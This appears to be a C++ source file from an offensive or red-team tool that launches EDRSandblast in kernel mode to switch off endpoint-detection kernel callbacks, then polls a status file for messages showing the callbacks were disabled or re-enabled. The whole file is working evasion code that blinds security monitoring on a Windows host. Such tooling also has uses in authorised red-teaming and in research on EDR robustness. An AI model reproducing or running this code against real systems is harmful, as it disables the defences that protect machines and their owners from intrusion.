#include <windows.h>
#include <iostream>
#include <fstream>
#include <string>

#include "sandblast.h"
#include "utils.h"

static std::wstring out_file = get_base_path() + L"tools\\sandblast-status.txt";

// disables kernel callbacks
RETURN_CODE disable_kernel_callbacks() {
    HANDLE hFile = CreateFile(
        out_file.c_str(),
        GENERIC_WRITE,
        FILE_SHARE_READ,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        std::cerr << "[!] Sandblast: Failed to create " << wstring2string(out_file) << ", Error:" << GetLastError() << "\n";
        return RETURN_CODE::FAILED;
    }

    // Setup process startup info
    STARTUPINFO si{};
    PROCESS_INFORMATION pi{};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hFile;
    si.hStdError = hFile;

	// Launch EDRSandblast with redirected output
    std::wstring cmd = get_base_path() + L"tools\\EDRSandblast.exe toggle_callbacks 0t1 --kernelmode -i > " + out_file;
    if (!CreateProcess(
        NULL, &cmd[0], NULL, NULL,
        FALSE, 0, NULL, NULL, &si, &pi)) {
        std::cerr << "[!] Sandblast: Failed to start '" << wstring2string(cmd) << "', Error:" << GetLastError() << "\n";
        CloseHandle(hFile);
        return RETURN_CODE::FAILED;
    }
	std::cout << "[+] Sandblast: Started '" << wstring2string(cmd) << "'\n";
    CloseHandle(hFile);

    // Now monitor out.txt
    size_t last_size = 0;
	double waited_seconds = 0;
	double timeout_seconds = 60.0; // this timeout is only reached if sandblast prints unexpected stuff
    while (waited_seconds < timeout_seconds) {
        std::ifstream in(out_file);
        if (!in || !in.is_open()) {
            std::cerr << "[!] Sandblast: Failed to open " << wstring2string(out_file) << "\n";
            return RETURN_CODE::FAILED;
		}
        in.seekg(0, std::ios::end);
        size_t size = in.tellg();
        if (size != last_size) {
            in.seekg(last_size);
            std::string line;
            while (std::getline(in, line)) {
                if (line.find("[*] No EDR callbacks found, nothing to disable") != std::string::npos) {
					return RETURN_CODE::SUCCESS_NO_WAIT;
                }
                if (line.find("[+] Waiting 30 seconds before re-enabling callbacks again...") != std::string::npos) {
                    return RETURN_CODE::SUCCESS_WAIT;
                }
            }
            last_size = size;
        }

        Sleep(100); // avoid busy waiting
		waited_seconds += 0.1;
    }
    return RETURN_CODE::TIMEOUT;
}

bool check_if_kernel_callbacks_enabled() {
    std::ifstream in(out_file);
    if (!in || !in.is_open()) {
        std::cerr << "[!] Sandblast: Failed to open " << wstring2string(out_file) << "\n";
        return false;
    }
    std::string line;
    while (std::getline(in, line)) {
        if (line.find("[*] Re-enabling all EDR callbacks...") != std::string::npos) {
            return true;
        }
        if (line.find("[*] No EDR callbacks found, nothing to disable") != std::string::npos) {
            return true;
        }
    }
    return false;
}